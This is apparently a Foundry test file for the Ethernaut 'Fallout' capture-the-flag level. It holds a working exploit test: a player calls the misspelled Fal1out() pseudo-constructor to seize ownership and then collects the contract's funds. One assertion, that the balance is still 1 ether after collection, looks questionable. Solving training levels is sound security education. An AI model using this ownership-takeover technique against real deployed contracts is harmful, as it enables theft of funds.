// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import "forge-std/Test.sol";
import {EthernautFallout} from "../../src/ethernaut/Fallout.sol";

contract FalloutTest is Test {
    EthernautFallout level;
    address player = makeAddr("player");

    function setUp() public {
        level = new EthernautFallout{value: 1 ether}();
        vm.deal(player, 1 ether);
    }

    function testDirectCollectionBlocked() public {
        vm.prank(player);
        vm.expectRevert("Not owner");
        level.collectAllocations();
    }

    function testFalloutExploit() public {
        vm.prank(player);
        level.Fal1out();

        assertEq(level.owner(), player);

        vm.prank(player);
        level.collectAllocations();
        assertEq(address(level).balance, 1 ether);
    }

    function testFuzz_Fal1outAlwaysChangesOwner(uint256 amount) public {
        amount %= 1 ether;
        vm.deal(player, amount);
        vm.prank(player);
        level.Fal1out{value: amount}();
        assertEq(level.owner(), player);
    }
}

